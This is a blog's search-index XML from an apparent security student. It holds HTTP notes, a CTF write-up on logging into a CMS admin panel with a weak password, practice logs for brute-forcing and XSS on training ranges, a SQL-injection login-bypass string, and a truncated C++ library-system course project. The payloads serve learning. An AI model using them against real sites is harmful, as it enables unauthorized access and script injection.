<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>杂记</title>
    <url>/2021/04/17/%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e022b5894217348190d43edd945b68d8be8cbc535146ba9b7dbf1c0cecf831b2">351274e506ceb21c1026bbf6d58125d7153f14cebb490764f31e5291b9e6e96889fac705c4d3f60a883d2278ce8542eb0ce146d5284e697709c288e0b53858732d2fb144f1a8ffbe9c3be66842828dc6895999c6ff7f6182cdb7eb981480504e8713356f87f4f119eb671b8fc97dea18</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这里需要密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>HTTP学习记录</title>
    <url>/2021/07/12/HTTP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>《图解HTTP》学习记录</p>
<span id="more"></span>

<h2 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h2><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>统一资源标识符（Uniform Resource Identifier，URI)是一个用于标识某一互联网资源名称的字符串。 该种标识允许用户对任何（包括本地和互联网）的资源通过特定的协议进行交互操作。URI由包括确定语法和相关协议的方案所定义</p>
<img src="/2021/07/12/HTTP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.jpg" style="zoom: 50%;">

<p>绝对路径格式</p>
<blockquote>
<p><a href="ftp://ftp.is.co.za/rfc/rfc1808.txt">ftp://ftp.is.co.za/rfc/rfc1808.txt</a>   </p>
<p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a>    </p>
<p>ldap://[2001:db8::7]/c=GB?objectClass?one    </p>
<p>mailto:<a href="mailto:&#x4a;&#x6f;&#104;&#110;&#x2e;&#x44;&#111;&#101;&#64;&#x65;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#x4a;&#x6f;&#104;&#110;&#x2e;&#x44;&#111;&#101;&#64;&#x65;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a>    </p>
<p>news:comp.infosystems.<a href="http://www.servers.unix/">www.servers.unix</a>    </p>
<p>tel:+1-816-555-1212    </p>
<p>telnet://192.0.2.16:80/    </p>
<p>urn:oasis:names:specification:docbook:dtd:xml:4.1.2</p>
</blockquote>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3>]]></content>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF × DASCTF 2021 WP</title>
    <url>/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/</url>
    <content><![CDATA[<p>只有一道题</p>
<span id="more"></span>

<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>打开是一个CMS做的企业用户网站，翻到最下面找到CMS类型</p>
<p><img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/1.jpg"></p>
<p>百度此类型CMS漏洞或后台等信息，在官网搜到</p>
<p><img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/2.jpg"></p>
<p>打开<code>http://xxx.node3.buuoj.cn/admin.php</code></p>
<img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/3.jpg" style="zoom:33%;">

<p>根据提示密码是五位弱口令，而Email还可以是用户名</p>
<p>正好主页</p>
<img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/4.jpg" style="zoom: 50%;">

<p>于是我就输入了这个邮箱，尝试11111，12345等最常见的五位弱口令，不对！…</p>
<p>后来经过出题人的提示才知道用户名不需要信息收集…</p>
<p>最后以admin/12345成功登录</p>
<p>登录后台后，查资料得到蝉知后台getshell的方法</p>
<p><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/">禅知后台getshell - Wiki</a></p>
<p>进行测试发现由于版本不同，此版本已无法进行复现此漏洞</p>
<p>在后台模板尝试修改</p>
<img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/5.jpg" style="zoom: 25%;">

<p>为了创建文件找到可以上传文件的地方</p>
<img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/6.jpg" style="zoom: 25%;">

<p>随便上传一个txt文件，修改文件名</p>
<p>然后再编辑模板即可保存</p>
<p>编辑后返回前台得到flag</p>
<img src="/2021/06/26/GKCTF-%C3%97-DASCTF-2021-WP/7.jpg" style="zoom: 25%;">

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场实战记录</title>
    <url>/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>渗透测试靶场练习</p>
<span id="more"></span>

<h1 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h1><h2 id="爆破练习"><a href="#爆破练习" class="headerlink" title="爆破练习"></a>爆破练习</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<p>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>等等…<br>千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的</p>
<blockquote>
<p>从来没有哪个时代的黑客像今天一样热衷于猜解密码 ——奥斯特洛夫斯基</p>
</blockquote>
<h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/1.jpg" style="zoom:80%;">

<p>一个登陆界面的表单，随便试试，然后BP抓包，发送到爆破模块，读字典爆破</p>
<p>(离谱的是Chrome抓不了包，应该是localhost的问题，火狐通过<code>about:config</code>修改一下抓取localhost的设定就好了，应该是Chrome的问题)</p>
<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><h2 id="XSS练习"><a href="#XSS练习" class="headerlink" title="XSS练习"></a>XSS练习</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>  1.反射性XSS;<br>  2.存储型XSS;<br>  3.DOM型XSS;</p>
<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br> 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br> 输出转义：根据输出点的位置对输出到前端的内容进行适当转义</p>
<h3 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h3><img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/2.jpg" style="zoom:80%;">

<p>是一个文本框，随便输一个测试功能正常</p>
<img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/3.jpg" style="zoom:80%;">

<p>输入特殊符号<code>&#39;</code> <code>&lt;</code>等发现无过滤</p>
<p>尝试输入payload发现文本框限制了字符数</p>
<p>审查元素修改一下<code>maxlength</code></p>
<p>再输入payload:  <code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/4.jpg" style="zoom:80%;">

<p>成功触发XSS</p>
<img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/5.jpg" style="zoom: 50%;">

<p>ps: 或者直接在地址栏输入</p>
<p><img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/6.jpg"></p>
<p>也可以成功触发XSS</p>
<h3 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h3><p>多一步登录的步骤</p>
<p>登陆后文本框同上题</p>
<p>同理输入payload，成功触发XSS</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/7.jpg" style="zoom: 50%;">

<p>是一个留言板，可以存入数据库，每次打开此页面都会显示之前的留言</p>
<p>并且，经测试，发现输入特殊符号<code>&#39;</code> <code>&lt;</code>无过滤</p>
<p>输入payload:  <code>&lt;script&gt;alert(&#39;存储型xss&#39;)&lt;/script&gt;</code></p>
<img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/8.jpg" style="zoom: 80%;">

<p>成功触发XSS，并且由于留言板写入数据库，每次打开此页面都会触发XSS</p>
<img src="/2021/06/16/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/9.jpg" style="zoom:67%;">

<h1 id="sqli-labs靶场"><a href="#sqli-labs靶场" class="headerlink" title="sqli-labs靶场"></a>sqli-labs靶场</h1><h1 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h1>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF学习笔记</title>
    <url>/2021/05/27/CTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>萌新的入坑记录而已</p>
<span id="more"></span>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><blockquote>
<p>登录界面必然会与数据库进行交互，所以是SQL注入的经典位置</p>
</blockquote>
<p>常见登陆界面SQL语句<code>select * from admin where username = &#39;用户输入的用户名&#39; and password = &#39;用户输入的密码&#39;</code><br>万能用户名:<code>&#39; or 1=1 -- </code>     (<code>-- </code>后面有一个空格)<br>第一个<code>&#39;</code>用于闭合SQL语句用户名的单引号，<code>1=1</code>永远为真，<code>-- </code>用于注释其后的密码语句，从而绕过登录验证 </p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>课程设计</title>
    <url>/2021/05/25/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<blockquote>
<p>C++结课作业，第一次搞了这么长的代码(虽然巨多bug，还有水行数的嫌疑<br>传上来玩玩🙏</p>
</blockquote>
<span id="more"></span>

<h1 id="图书馆管理系统"><a href="#图书馆管理系统" class="headerlink" title="图书馆管理系统"></a>图书馆管理系统</h1><h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//*****************************图书馆管理系统***********************************</span></span><br><span class="line"><span class="comment">//计算机科学与技术学院/人工智能学院</span></span><br><span class="line"><span class="comment">//162020113 李博轩</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;basic.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;manage.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;________________________________________________________________________&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                      欢迎来到NUAA图书馆管理系统			|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|----------------------------------------------------------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|               请选择您的身份(学生-S/教师-T/管理-A)			|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|                                                                      |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|______________________________________________________________________|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	Students student;</span><br><span class="line">	Teachers teacher;</span><br><span class="line">	Manage manager;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> judge_identity;</span><br><span class="line">	<span class="comment">//选择身份</span></span><br><span class="line">	<span class="keyword">char</span> judge1;</span><br><span class="line">	<span class="comment">//选择注册/登录</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择身份:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge_identity;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">switch</span> (judge_identity) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册/登录(R/L):\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">if</span> (judge1 == <span class="string">&#x27;R&#x27;</span> || judge1 == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">						student.registered();</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;L&#x27;</span> || judge1 == <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">						student.login();</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册/登录(R/L):\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">if</span> (judge1 == <span class="string">&#x27;R&#x27;</span> || judge1 == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">						student.registered();</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;L&#x27;</span> || judge1 == <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">						student.login();</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册/登录(R/L):\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">if</span> (judge1 == <span class="string">&#x27;R&#x27;</span> || judge1 == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">						teacher.registered();</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;L&#x27;</span> || judge1 == <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">						teacher.login();</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册/登录(R/L):\t&quot;</span>;</span><br><span class="line">				<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">				<span class="built_in">cin</span>.ignore();</span><br><span class="line">				<span class="keyword">if</span> (judge1 == <span class="string">&#x27;R&#x27;</span> || judge1 == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">					teacher.registered();</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;L&#x27;</span> || judge1 == <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">					teacher.login();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: &#123;</span><br><span class="line">				manager.login();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>: &#123;</span><br><span class="line">				manager.login();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符!请重新输入!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="struct-h"><a href="#struct-h" class="headerlink" title="struct.h"></a>struct.h</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STRUCT_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//书籍信息结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> book_name[<span class="number">25</span>];</span><br><span class="line">	<span class="keyword">char</span> book_location[<span class="number">25</span>];</span><br><span class="line">	<span class="keyword">char</span> book_author[<span class="number">15</span>];</span><br><span class="line">	<span class="keyword">int</span> book_num = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//学生信息结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">students</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ID;</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> ownbook_name[<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//教师信息结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">teachers</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ID;</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> ownbook_name[<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//管理员信息结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">admins</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ID;</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//馆长信息结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">directors</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> ID[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h2 id="basic-h"><a href="#basic-h" class="headerlink" title="basic.h"></a>basic.h</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BASIC_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASIC_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;struct.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;manage.h&quot;</span>	<span class="comment">//使用友元函数必须？</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Basic</span> &#123;</span></span><br><span class="line">	<span class="keyword">protected</span>:</span><br><span class="line">		<span class="keyword">char</span> *book_name;</span><br><span class="line">		<span class="keyword">char</span> *book_location;</span><br><span class="line">		<span class="keyword">char</span> *book_author;</span><br><span class="line">		<span class="keyword">int</span> book_num;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		Basic() &#123;&#125;;</span><br><span class="line">		~Basic() &#123;</span><br><span class="line">			<span class="keyword">delete</span>[] book_name;</span><br><span class="line">			<span class="keyword">delete</span>[] book_location;</span><br><span class="line">			<span class="keyword">delete</span>[] book_author;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">booksearch</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Books</span>:</span> <span class="keyword">public</span> Basic &#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		Books() &#123;&#125;</span><br><span class="line">		~Books() &#123;</span><br><span class="line">			<span class="keyword">delete</span> []book_name;</span><br><span class="line">			<span class="keyword">delete</span> []book_location;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">Manage::addbook</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//管理类友元函数添加书籍</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span>:</span> <span class="keyword">public</span> Basic &#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">char</span> *student_name;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> student_ID;</span><br><span class="line">		<span class="keyword">char</span> *student_password;</span><br><span class="line">		<span class="keyword">char</span> *ownbook_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		Students() &#123;</span><br><span class="line">			ownbook_name = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">10</span>];</span><br><span class="line">			<span class="built_in">strcpy</span>(ownbook_name, <span class="string">&quot;-No Book-&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		~Students() &#123;	<span class="comment">//析构函数，释放空间</span></span><br><span class="line">			<span class="keyword">delete</span> []student_name;</span><br><span class="line">			<span class="keyword">delete</span> []ownbook_name;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">registered</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//学生注册</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//学生登录</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">choose</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//选择功能</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">borrow</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//借书</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">repay</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//还书</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teachers</span>:</span> <span class="keyword">public</span> Basic &#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">char</span> *teacher_name;</span><br><span class="line">		<span 